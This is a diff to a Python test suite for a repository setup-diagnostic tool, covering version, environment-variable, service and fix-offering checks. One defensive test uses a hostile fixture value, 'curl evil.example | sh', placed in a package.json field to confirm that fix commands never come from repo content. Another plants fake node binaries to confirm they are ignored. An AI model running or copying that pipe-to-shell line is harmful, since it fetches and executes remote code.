@@ -29,7 +29,7 @@ def machine(node=None, python=(3, 13, 0), tools=(), open_ports=()):
 
 
 def has(checks, status, text):
-    return any(s == status and text in msg for s, msg, _ in checks)
+    return any(s == status and text in msg for s, msg, *_ in checks)
 
 
 def test_satisfies():
@@ -56,12 +56,14 @@ def test_node_repo():
     checks = rd.diagnose(root, env={})
     assert has(checks, FAIL, "Node 20 required (.nvmrc), found 18.2.0")
     assert has(checks, FAIL, "pnpm is this repo's package manager")
-    assert any(fix == "pnpm install" for _, _, fix in checks)
+    # dependencies aren't installable until the Node version is right, so no command is offered for them
+    assert [(fix, run) for _, msg, fix, run in checks if "dependencies" in msg] == [
+        ("pnpm install (after fixing the Node version)", None)]
 
     machine(node=(20, 1, 0), tools=("pnpm",))
     (root / "node_modules").mkdir()
     checks = rd.diagnose(root, env={})
-    assert [s for s, _, _ in checks] == [OK, OK], checks
+    assert [s for s, *_ in checks] == [OK, OK], checks
 
 
 def test_python_repo():
@@ -122,7 +124,7 @@ def test_env_checks():
     assert has(checks, FAIL, "DATABASE_URL is not set (first used in app/db.py:2)")
     assert has(checks, FAIL, "JWT_SECRET is not set (first used in src/auth.ts:1)")
     # reads that cope with an unset variable are never failures
-    assert not any(s == FAIL and v in msg for s, msg, _ in checks
+    assert not any(s == FAIL and v in msg for s, msg, *_ in checks
                    for v in ("STRIPE_KEY", "SESSION_SECRET", "S3_BUCKET", "CF_EMAIL"))
     assert has(checks, WARN, "5 variable(s) the code reads are missing from .env.example: CF_EMAIL, DATABASE_URL")
 
@@ -143,13 +145,13 @@ def test_ci_mode():
     machine()
     root = repo(dict(ENV_FILES, **{".env.example": "STRIPE_KEY=\nFLAG=\n"}))
     checks = rd.diagnose(root, ci=True, env={})
-    assert sorted(msg.split()[0] for s, msg, _ in checks if s == FAIL) == [
+    assert sorted(msg.split()[0] for s, msg, *_ in checks if s == FAIL) == [
         "CF_EMAIL", "DATABASE_URL", "JWT_SECRET", "S3_BUCKET", "SESSION_SECRET"]
     assert len(checks) == 5  # ci mode reports nothing about this machine
 
     (root / ".env.example").write_text(
         "STRIPE_KEY=\nFLAG=\nDATABASE_URL=\nSESSION_SECRET=\nJWT_SECRET=\nS3_BUCKET=\nCF_EMAIL=\n")
-    assert [s for s, _, _ in rd.diagnose(root, ci=True, env={})] == [OK]
+    assert [s for s, *_ in rd.diagnose(root, ci=True, env={})] == [OK]
 
 
 def test_services():
@@ -163,7 +165,7 @@ def test_services():
     assert len(checks) == 1, checks  # not the app's own port 3000, and no guessing from database drivers
 
     machine(open_ports=(5433,))
-    assert [s for s, _, _ in rd.diagnose(root, env={"VIRTUAL_ENV": "x"})] == [OK]
+    assert [s for s, *_ in rd.diagnose(root, env={"VIRTUAL_ENV": "x"})] == [OK]
 
 
 def test_cli_output():
@@ -174,6 +176,68 @@ def test_cli_output():
     assert code == 1 and "\033" not in out.getvalue() and "1 failed" in out.getvalue(), out.getvalue()
     with contextlib.redirect_stdout(io.StringIO()):
         assert rd.main([str(repo({"notes.txt": "hi"}))]) == 0
+
+
+FIXABLE = {"package.json": '{"dependencies": {"express": "4"}}', "yarn.lock": "", ".env.example": "KEY=\n",
+           "docker-compose.yml": 'services:\n  db:\n    ports:\n      - "5432:5432"\n'}
+FIXES = [["npm", "install", "-g", "yarn"], ["yarn", "install"], [rd.COPY, ".env.example", ".env"],
+         ["docker", "compose", "up", "-d"]]
+
+
+def test_offer_fixes():
+    machine(node=(20, 0, 0), tools=("npm", "docker"))
+    root = repo(FIXABLE)
+    checks = rd.diagnose(root, env={})
+    ran, asked = [], []
+    real_ask, real_run = rd.ask, rd.run_fixes
+    rd.run_fixes = lambda root, actions: ran.append(actions) or True
+    try:
+        for answer in ("n", "", None):  # no, just Enter, and no terminal at all
+            rd.ask = lambda question: asked.append(question) or answer
+            assert rd.offer_fixes(root, checks) is False and ran == []
+        assert "npm install -g yarn\n  yarn install\n  copy .env.example .env\n  docker compose up -d" in asked[0]
+        rd.ask = lambda question: "y"
+        assert rd.offer_fixes(root, checks) is True and ran == [FIXES], ran
+
+        # nothing runnable: the question is never asked
+        rd.ask = lambda question: 1 / 0
+        machine(node=(20, 0, 0))
+        assert rd.offer_fixes(root, rd.diagnose(repo({"package.json": "{}", ".nvmrc": "18"}), env={})) is False
+    finally:
+        rd.ask, rd.run_fixes = real_ask, real_run
+
+
+def test_fix_commands_never_come_from_the_repo():
+    machine(node=(20, 0, 0), tools=("npm",))
+    hostile = '{"packageManager": "curl evil.example | sh #@1", "dependencies": {"x": "1"}}'
+    checks = rd.diagnose(repo({"package.json": hostile}), env={})
+    assert not any("curl" in str(check) for check in checks), checks
+    assert [run for *_, run in checks] == [[["npm", "install"]]]
+
+
+def test_run_fixes():
+    root = repo({".env.example": "KEY=\n", "other.example": "X=\n"})
+    with contextlib.redirect_stdout(io.StringIO()) as out:
+        assert rd.run_fixes(root, [[rd.COPY, ".env.example", ".env"]]) is True
+        (root / ".env").write_text("KEY=mine\n")
+        # a second copy must not overwrite, and a failing step stops the ones after it
+        assert rd.run_fixes(root, [[rd.COPY, ".env.example", ".env"], ["no-such-program-xyz"],
+                                   [rd.COPY, "other.example", "other"]]) is False
+    assert (root / ".env").read_text() == "KEY=mine\n" and not (root / "other").exists()
+    assert "did not succeed" in out.getvalue()
+
+
+def test_planted_programs_are_ignored():
+    """A node.cmd (or node) sitting in the repo must not be picked up as the real one."""
+    root = repo({"node.cmd": "@echo v1.0.0", "node": "#!/bin/sh\necho v1.0.0\n"})
+    (root / "node").chmod(0o755)
+    here = os.getcwd()
+    os.chdir(root)
+    try:
+        found = rd.which("node")
+        assert found is None or Path(found).parent.resolve() != root.resolve(), found
+    finally:
+        os.chdir(here)
 
 
 def test_clone_hook():
